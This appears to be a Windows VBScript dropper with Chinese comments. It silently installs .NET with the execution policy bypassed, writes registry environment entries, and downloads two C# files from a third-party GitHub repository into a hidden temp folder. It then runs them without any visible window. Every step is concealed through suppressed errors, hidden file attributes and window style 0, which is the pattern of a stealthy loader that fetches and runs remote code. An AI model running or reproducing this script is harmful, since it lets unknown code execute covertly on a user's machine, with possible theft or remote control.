' Suppress all error popups (script will run silently in background)
On Error Resume Next

Dim objShell, fso, tempDir, configDir, dotnetPath, installerScript
Dim downloadCmd, installCmd, runCmd, args, dotnetExe, folderObj

Set objShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

If objShell Is Nothing Or fso Is Nothing Then WScript.Quit

' 定义路径
tempDir = objShell.ExpandEnvironmentStrings("%TEMP%")
configDir = tempDir & "\.config"
dotnetPath = objShell.ExpandEnvironmentStrings("%USERPROFILE%") & "\.dotnet"
installerScript = tempDir & "\dotnet-install.ps1"

' 1. 创建隐藏目录
If Not fso.FolderExists(configDir) Then
    fso.CreateFolder(configDir)
End If
Set folderObj = fso.GetFolder(configDir)
folderObj.Attributes = folderObj.Attributes Or 2 ' 2 = Hidden

' 2. 静默下载 dotnet-install.ps1 (取代原来的 exe)
downloadCmd = "cmd /c curl -sL -o """ & installerScript & """ https://dot.net/v1/dotnet-install.ps1"
objShell.Run downloadCmd, 0, True

' 3. 静默运行 ps1 脚本进行安装 (无需管理员权限)
' -Channel 10.0 安装 .NET 10，-InstallDir 指定用户目录
installCmd = "powershell -NoProfile -ExecutionPolicy Bypass -File """ & installerScript & """ -Channel 10.0 -InstallDir """ & dotnetPath & """"
objShell.Run installCmd, 0, True

' 4. 设置永久环境变量
SetUserEnv "DOTNET_ROOT", dotnetPath
AppendToUserPath dotnetPath

' 5. 静默下载 C# 文件
Dim url1, url2, path1, path2
url1 = "https://raw.githubusercontent.com/rahul-call/inner/main/ror/client.cs"
url2 = "https://raw.githubusercontent.com/rahul-call/inner/main/ror/auto.cs"
path1 = configDir & "\client.cs"
path2 = configDir & "\auto.cs"

objShell.Run "cmd /c curl -sL -o """ & path1 & """ """ & url1 & """", 0, True
objShell.Run "cmd /c curl -sL -o """ & path2 & """ """ & url2 & """", 0, True

If fso.FileExists(path1) Then fso.GetFile(path1).Attributes = 2
If fso.FileExists(path2) Then fso.GetFile(path2).Attributes = 2

' 6. 静默执行 dotnet
dotnetExe = dotnetPath & "\dotnet.exe"
args = "run --file auto.cs -- client.cs --hidden"
runCmd = "cmd /c cd /d """ & configDir & """ && """ & dotnetExe & """ " & args
objShell.Run runCmd, 0, False

' ---------------------------------------------------------
' Helper Functions
' ---------------------------------------------------------
Sub SetUserEnv(varName, varValue)
    Dim regPath
    regPath = "HKCU\Environment\" & varName
    objShell.RegWrite regPath, varValue, "REG_EXPAND_SZ"
End Sub

Sub AppendToUserPath(newPath)
    Dim currentPath, regPath, paths, p, found
    regPath = "HKCU\Environment\Path"
    currentPath = objShell.RegRead(regPath)
    
    If currentPath = "" Then
        objShell.RegWrite regPath, newPath, "REG_EXPAND_SZ"
        Exit Sub
    End If
    
    found = False
    paths = Split(currentPath, ";")
    For Each p In paths
        If LCase(Trim(p)) = LCase(newPath) Then
            found = True
            Exit For
        End If
    Next
    
    If Not found Then
        objShell.RegWrite regPath, newPath & ";" & currentPath, "REG_EXPAND_SZ"
    End If
End Sub